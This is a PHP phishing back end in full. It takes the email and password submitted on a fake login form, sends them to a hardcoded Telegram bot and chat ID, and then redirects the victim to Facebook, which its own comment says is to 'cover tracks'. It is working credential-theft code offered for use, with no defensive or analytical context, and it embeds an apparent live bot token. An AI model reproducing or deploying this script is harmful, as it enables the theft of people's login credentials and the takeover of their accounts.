<?php
// Telegram bot token
$botToken = 7349492684:AAGBHVDDwRBQzE9LFju5xZuJwjUSbGZo4us";  // Replace with your actual bot token

// Your Telegram chat ID
$chatId = "6682581196";  // Replace with the correct chat ID

// Get login info from the POST request
$email = $_POST['email'];
$password = $_POST['password'];

// Prepare the message to send to Telegram
$message = "🔥 NEW LOGIN 🔥\nEmail: $email\nPassword: $password";

// Send the message to Telegram
$apiUrl = "https://api.telegram.org/bot$botToken/sendMessage";
$params = array(
    'chat_id' => $chatId,
    'text' => $message,
);

// Make the request to the Telegram API
file_get_contents($apiUrl . "?" . http_build_query($params));

// Redirect to Facebook to cover tracks
header("Location: https://www.facebook.com/");
exit();
?>